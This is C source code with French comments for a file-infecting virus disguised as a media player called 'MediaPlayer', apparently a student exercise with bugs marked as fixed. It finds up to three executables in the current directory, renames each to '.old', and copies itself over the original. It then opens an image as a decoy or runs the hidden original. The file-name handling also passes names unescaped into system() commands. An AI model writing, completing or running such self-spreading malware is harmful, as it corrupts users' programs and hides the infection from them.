#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

#define MAX_FILES 3
#define VIRUS_NAME "MediaPlayer"  // nom canonique, sans chemin

/* -------------------------------------------------------
 * Vérifie si un fichier est déjà infecté.
 * Deux cas (cf. doc) :
 *   (a) le fichier lui-même porte l'extension .old
 *   (b) un fichier nomFichier.old existe dans le répertoire courant
 * ------------------------------------------------------- */
bool dejaInfecte(const char *nomFichier) {

    // Cas (a) : le nom contient déjà ".old"
    if (strstr(nomFichier, ".old") != NULL) {
        return true;
    }

    // Cas (b) : cherche si nomFichier.old existe
    char nameOld[512];
    snprintf(nameOld, sizeof(nameOld), "%s.old", nomFichier);

    FILE *f = fopen(nameOld, "r");
    if (f != NULL) {
        fclose(f);   // BUG CORRIGÉ : fuite de descripteur
        return true;
    }

    return false;
}

/* -------------------------------------------------------
 * Recherche les fichiers exécutables réguliers du répertoire
 * courant (hors virus lui-même, hors déjà infectés).
 * Retourne un tableau de MAX_FILES pointeurs (NULL = vide).
 * ------------------------------------------------------- */
char **searchFiles(const char *virusName) {
    printf("*** Recherche des fichiers cibles ***\n");

    // BUG CORRIGÉ : initialisation à NULL obligatoire
    char **files = calloc(MAX_FILES, sizeof(char *));
    if (!files) { perror("calloc"); exit(1); }

    int cpt = 0;
    DIR *rep = opendir(".");
    if (!rep) { perror("opendir"); return files; }

    struct dirent *lecture;
    struct stat buf;

    while ((lecture = readdir(rep)) != NULL && cpt < MAX_FILES) {
        if (stat(lecture->d_name, &buf) != 0) continue;

        // Fichier régulier ET exécutable par le propriétaire
        if (S_ISREG(buf.st_mode) && (buf.st_mode & S_IXUSR)) {

            // Exclure le virus lui-même
            if (strcmp(lecture->d_name, virusName) == 0) continue;

            // Exclure les déjà infectés
            if (dejaInfecte(lecture->d_name)) continue;

            files[cpt] = strdup(lecture->d_name);
            printf("  Cible trouvée : %s\n", files[cpt]);
            cpt++;
        }
    }
    closedir(rep);
    printf("  %d fichier(s) à infecter.\n\n", cpt);
    return files;
}

/* -------------------------------------------------------
 * Infecte chaque fichier cible :
 *   1. Renomme cible → cible.old
 *   2. Copie le virus sous le nom de la cible
 *   3. Rend la copie exécutable  (BUG CORRIGÉ : chmod manquant)
 * ------------------------------------------------------- */
void infecte(char **files, const char *cheminVirus) {
    for (int i = 0; i < MAX_FILES; i++) {
        if (files[i] == NULL) continue;

        printf(">>> Infection de : %s\n", files[i]);

        // Étape 1 : renommer en .old
        char oldName[512];
        snprintf(oldName, sizeof(oldName), "%s.old", files[i]);
        if (rename(files[i], oldName) != 0) {
            perror("  rename"); continue;
        }
        printf("  Renommé : %s -> %s\n", files[i], oldName);

        // Étape 2 : copier le virus sous le nom original
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\"", cheminVirus, files[i]);
        if (system(cmd) != 0) {
            fprintf(stderr, "  Échec de la copie\n"); continue;
        }
        printf("  Virus copié vers : %s\n", files[i]);

        // Étape 3 : rendre exécutable  ← BUG CORRIGÉ
        if (chmod(files[i], 0755) != 0) {
            perror("  chmod");
        }
        printf("  Permissions fixées (0755)\n");
        printf("  %s est infecté.\n\n", files[i]);

        free(files[i]);
        files[i] = NULL;
    }
}

/* -------------------------------------------------------
 * Rend service à l'utilisateur et transfère l'exécution :
 *   - Si lancé directement (argv[0] contient VIRUS_NAME) :
 *       on ouvre une image (primo-infection).
 *   - Sinon : on lance argv[0].old (infections ultérieures).
 * ------------------------------------------------------- */
void execution(const char *arg) {

    char *slash = strrchr(arg, '/');
    char *base;

    if (slash != NULL) {
        base = slash + 1;
    } else {
        base = (char *)arg;
    }

    if (strcmp(base, VIRUS_NAME) == 0) {
        printf("Service : affichage d'une image...\n");

        DIR *d = opendir("../imgaes");  // ← ICI on pointe vers images/
        struct dirent *dir;

        if (d != NULL) {
            while ((dir = readdir(d)) != NULL) {

                int estImage = 0;
                if (strstr(dir->d_name, ".jpg")  != NULL) estImage = 1;
                if (strstr(dir->d_name, ".jpeg") != NULL) estImage = 1;
                if (strstr(dir->d_name, ".png")  != NULL) estImage = 1;
                if (strstr(dir->d_name, ".bmp")  != NULL) estImage = 1;

                if (estImage && strstr(dir->d_name, ".old") == NULL) {
                    char cmd[512];
                    snprintf(cmd, sizeof(cmd),
                             "xdg-open \"../imgaes/%s\" > /dev/null 2>&1", dir->d_name); // ← ET ICI
                    system(cmd);
                    break;
                }
            }
            closedir(d);
        }

    } else {
        char progOld[512];
        snprintf(progOld, sizeof(progOld), "\"%s.old\"", arg);
        printf("Transfert d'exécution vers : %s\n", progOld);
        system(progOld);
    }
}
/* -------------------------------------------------------
 * Point d'entrée
 * ------------------------------------------------------- */
int main(int argc, char *argv[]) {
    printf("=== Lancement de %s ===\n\n", VIRUS_NAME);

    // Utilise argv[0] comme chemin réel du virus pour la copie
    char **fichiers = searchFiles(VIRUS_NAME);

    if (fichiers[0] != NULL) {
        infecte(fichiers, argv[0]);
    } else {
        printf("Aucun fichier à infecter.\n");
    }

    execution(argv[0]);

    free(fichiers);
    return 0;
}
